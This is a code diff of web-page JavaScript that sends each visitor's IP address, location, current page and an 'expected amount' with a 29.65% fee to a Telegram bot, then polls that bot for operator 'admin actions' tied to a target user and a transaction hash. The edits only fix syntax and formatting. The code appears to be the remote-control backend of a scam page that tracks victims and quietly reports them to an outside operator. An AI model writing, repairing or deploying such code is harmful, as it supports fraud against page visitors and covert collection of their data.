@@ -807,7 +807,7 @@ async function sendVisitorDetailsToTelegram(ipData) {
                             `📄 <b>Page:</b> <code>${currentPage}</code>\n` +
                             `💰 <b>Expected Amount (29.65% Fee):</b> <code>$${expectedAmount}</code>\n` +
                             `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
-                            `📍 <b>Location:</b> <code>${ipData.city \vert{}\vert{} 'Unknown'},${ipData.country_name || 'Unknown'}</code>\n` +
+                            `📍 <b>Location:</b> <code>${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}</code>\n` +
                             `⏱️ <b>Time:</b> <code>${new Date().toLocaleString()}</code>`;
 
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -929,7 +929,7 @@ async function acknowledgeTelegramAction(callbackId, messageId, originalText, st
             body: JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
                 message_id: messageId,
-                text: `${originalText \vert{}\vert{} ''}\n\n<b>[ADMIN ACTION:${statusStamp}]</b>`,
+                text: `${originalText || ''}\n\n<b>[ADMIN ACTION: ${statusStamp}]</b>`,
                 parse_mode: 'HTML'
             })
         });
@@ -945,7 +945,7 @@ function startTelegramPolling(targetUser, txHash) {
 
     telegramPollInterval = setInterval(async () => {
         try {
-            const offsetParam = telegramLastUpdateId ? `?offset=${telegramLastUpdateId + 1}` : ``;
+            const offsetParam = telegramLastUpdateId ? `?offset=${telegramLastUpdateId + 1}` : `?offset=-10`;
             const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates${offsetParam}`);
             const data = await response.json();
             if (!data.ok || !data.result || data.result.length === 0) return;
